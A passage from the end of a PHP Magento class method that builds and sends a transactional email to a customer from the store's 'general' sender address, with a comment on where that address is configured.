                    'store' => $this->storeManager->getStore(),
                    'email' => $customer->getEmail(),
                ]
            )
            ->setFrom('general')
            // you can config general email address in Store -> Configuration -> General -> Store Email Addresses
            ->addTo($customer->getEmail(), $customer->getName())
            ->getTransport();
        $transport->sendMessage();
        return $this;
    }
}
